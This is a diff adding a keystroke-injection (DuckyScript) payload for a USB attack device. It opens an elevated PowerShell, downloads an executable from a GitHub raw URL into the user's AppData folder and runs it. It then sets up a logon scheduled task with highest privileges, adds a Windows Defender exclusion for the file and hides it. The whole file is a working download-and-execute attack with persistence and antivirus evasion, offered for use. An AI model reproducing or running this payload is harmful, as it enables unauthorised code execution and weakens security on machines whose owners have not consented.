@@ -1,0 +1,39 @@
+DEFAULTCHARDELAY 200
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 1500
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 2000
+STRING $url = "https://github.com/Ocanath/cena-landmine/raw/refs/heads/spacebar-landmine/dist/sw_cen.exe"
+ENTER
+DELAY 250
+STRING $output = "$env:USERPROFILE\AppData\Local\sw_cen.exe"
+ENTER
+DELAY 250
+STRING $destination = "$env:USERPROFILE\AppData\Local"
+ENTER 
+DELAY 250
+STRING Set-Location -Path $destination
+ENTER
+DELAY 250
+STRING Invoke-WebRequest -Uri $url -OutFile $output ; if($?) { Start-Process ".\sw_cen.exe" }
+ENTER
+DELAY 250
+DELAY 500
+STRING if($?) Register-ScheduledTask -TaskName "sw_cen" -Action (New-ScheduledTaskAction -Execute $output) -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable) -Force
+ENTER
+DELAY 250
+STRING if($?) {Add-MpPreference -ExclusionProcess $output}
+ENTER
+DELAY 250
+DELAY 50
+STRING if($?) {Set-ItemProperty -LiteralPath $output -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) }
+ENTER
+DELAY 500
+STRING if($?) {exit}
+ENTER
